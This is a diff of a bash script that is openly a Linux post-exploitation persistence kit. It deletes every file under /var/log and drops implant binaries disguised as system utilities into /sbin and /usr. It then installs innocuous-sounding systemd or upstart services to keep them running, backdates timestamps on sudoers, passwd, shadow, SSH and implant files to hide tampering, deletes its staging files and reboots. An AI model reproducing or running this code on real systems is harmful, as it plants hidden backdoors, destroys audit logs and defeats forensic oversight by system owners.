@@ -14,9 +14,13 @@
 #	- Timestomp
 
 # Check sysv or systemd
-#pidof systemd && SYSD=1 || SYSD=0
-
-
+pidof systemd && SYSD=1 || SYSD=0
+if [[ $SYSD == 1 ]]; 
+then
+	echo "[!] SYSTEMD PRESENT"
+else
+	echo "[!] SYSTEMD NOT PRESENT"
+fi
 
 # Check Release to see if Ubuntu/CentOS
 if [[ -f /etc/centos-release ]]
@@ -263,51 +267,81 @@ echo "[!] SSHKEYS dropped"
 # LOGGER MCLOGGERSON MEANY PANTS MCGEE
 
 find /var/log -type f -delete
-cp /tmp/pwn/l3ts_g3t_fUnKii /var/log/
+cp ./pwn/l3ts_g3t_fUnKii /var/log/
 
 # PRISM
-chmod 7700 ./fsdisk
-cp ./fsdisk /sbin/
-/sbin/fsdisk
+chmod 7700 ./bin/fsdisk
+cp ./bin/fsdisk /sbin/
 
-chmod 7700 ./devutil
-cp ./devutil /usr/local/
-/usr/local/devutil
+chmod 7700 ./bin/devutil
+cp ./bin/devutil /usr/local/
 
-chmod 7700 ./udevd
-cp ./udevd /sbin/
-/sbin/udevd
+chmod 7700 ./bin/update-util
+cp ./bin/update-util /usr/bin/
 
 echo "[!] PRISM dropped"
 
 
+if [[ SYSD == 1 ]]; then
 
+	# SYSTEMD PERSISTENCE
+	chmod 777 ./systemd/developer-utility.service
+	cp ./systemd/developer-utility.service /etc/systemd/system/
+	systemctl start developer-utility.service
+	systemctl enable developer-utility.service
 
-# SYSTEMD PERSISTENCE
-chmod 777 ./developer-utility.service
-cp ./developer-utility.service /etc/systemd/system/
-systemctl start developer-utility.service
-systemctl enable developer-utility.service
+	chmod 777 ./systemd/update-utility.service
+	cp ./systemd/update-utility.service /etc/systemd/system/
+	systemctl start update-utility.service
+	systemctl enable update-utility.service
 
-chmod 777 ./developer-utility-daemon.service
-cp ./developer-utility-daemon.service /etc/systemd/system/
-systemctl start developer-utility-daemon.service
-systemctl enable developer-utility-daemon.service
+	chmod 777 ./systemd/filesys.service
+	cp ./systemd/filesys.service /etc/systemd/system/
+	systemctl start filesys.service
+	systemctl enable filesys.service
 
-chmod 777 ./filesys.service
-cp ./filesys.service /etc/systemd/system/
-systemctl start filesys.service
-systemctl enable filesys.service
+	echo "[!] SYSTEMD set"
+else
+	chmod 777 ./upstart/fsdisk.conf
+	cp ./upstart/fsdisk.conf /etc/init/
+	initctl start fsdisk
 
-echo "[!] SYSTEMD set"
+	chmod 777 ./upstart/devutil.conf
+	cp ./upstart/devutil.conf /etc/init/
+	initctl start devutil
 
-
+	chmod 777 ./upstart/update-util.conf
+	cp ./upstart/update-util.conf /etc/init/
+	initctl start update-util
+fi
 
 
 #===============================================================================
 				# TIMESTOMP #
 #===============================================================================
 
+# SSH
+touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
+touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
+
+touch -a --date "2020-3-20 20:51:30" /etc/ssh
+touch -m --date "2020-3-20 20:51:30" /etc/ssh
+
+for target in `find /home | grep .ssh`; do
+	touch -a --date "2020-1-27 13:06:01" $target
+	touch -m --date "2020-1-27 13:06:01" $target
+done
+
+# for target in `find /home`; do
+# 	touch -a --date "2020-1-27 13:06:01" $target
+# 	touch -m --date "2020-1-27 13:06:01" $target
+# done
+
+touch -a --date "2020-3-20 20:51:30" /home
+touch -m --date "2020-3-20 20:51:30" /home
+
+
+# ADMIN
 touch -a --date "2020-3-20 20:51:30" /etc/sudoers
 touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
@@ -317,66 +351,80 @@ touch -m --date "2020-11-20 20:51:30" /etc/passwd
 touch -a --date "2020-11-20 20:51:30" /etc/shadow
 touch -m --date "2020-11-20 20:51:30" /etc/shadow
 
-touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
-touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
-
 touch -a --date "2020-3-20 20:51:30" /etc/sudoers
 touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
+# IMPLANTS
 touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
 touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk
-
-touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
-touch -m --date "2016-11-21 20:51:30" /usr/local/devutil
-
-touch -a --date "2020-11-30 20:51:30" /sbin/udevd
-touch -m --date "2020-11-30 20:51:30" /sbin/udevd
 
 touch -a --date "2020-11-30 20:51:30" /sbin
 touch -m --date "2020-11-30 20:51:30" /sbin
 
-touch -a --date "2021-1-30 20:51:30" /etc/ssh
-touch -m --date "2021-1-30 20:51:30" /etc/ssh
+touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
+touch -m --date "2016-11-21 20:51:30" /usr/local/devutil
+
+touch -a --date "2016-11-21 20:51:30" /usr/local
+touch -m --date "2016-11-21 20:51:30" /usr/local
+
+touch -a --date "2020-11-30 20:51:30" /usr/bin/update-util
+touch -m --date "2020-11-30 20:51:30" /usr/bin/update-util
+
+touch -a --date "2020-11-30 20:51:30" /usr/bin
+touch -m --date "2020-11-30 20:51:30" /usr/bin
+
+touch -a --date "2016-8-10 20:51:30" /usr
+touch -m --date "2016-8-10 20:51:30" /usr
 
 
 
-touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
-touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
+if [[ SYSD == 1 ]]; then
+	# SYSTEMD
+	touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/update-utility.service
+	touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/update-utility.service
 
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
+	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
+	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
 
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
+	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
+	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
 
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/
+	touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/
+	touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/
 
-touch -a --date "2020-3-20 20:51:30" /etc/systemd/
-touch -m --date "2020-3-20 20:51:30" /etc/systemd/
+	touch -a --date "2019-3-20 20:51:30" /etc/systemd/
+	touch -m --date "2019-3-20 20:51:30" /etc/systemd/
+else
+	# UPSTART
+	touch -a --date "2020-5-20 09:54:30" /etc/init/fsdisk.conf
+	touch -m --date "2020-5-20 09:54:30" /etc/init/fsdisk.conf
 
+	touch -a --date "2020-5-20 09:54:30" /etc/init/devutil.conf
+	touch -m --date "2020-5-20 09:54:30" /etc/init/devutil.conf
 
+	touch -a --date "2020-5-20 09:54:30" /etc/init/update-util.conf
+	touch -m --date "2020-5-20 09:54:30" /etc/init/update-util.conf
+
+	touch -a --date "2018-5-14 09:54:30" /etc/init
+	touch -m --date "2018-5-14 09:54:30" /etc/init
+fi
 
 touch -a --date "2020-11-30 20:51:30" /etc
 touch -m --date "2020-11-30 20:51:30" /etc
 
-for target in `find /home | grep .ssh`; do
-	touch -a --date "2020-1-27 13:06:01" $target
-	touch -m --date "2020-1-27 13:06:01" $target
-done
-
-
 
 echo "[!] TIMESTOMPd"
 
-rm -f /tmp/filesys.service
-rm -f /tmp/udevd
-rm -f /tmp/fsdisk
-rm -f /tmp/devutil
-rm -f /tmp/developer-utility.service
-rm -f /tmp/developer-utility-daemon.service
-rm -rf /tmp/pwn
+# CLEANUP
+rm -rf ./bin
+rm -rf ./pwn
+rm -rf ./upstart
+rm -rf ./systemd
+rm -rf ./config.sh
 
 echo "[!] CLEANED"
+echo "[!] REBOOTING"
+
+reboot
 
 exit 0
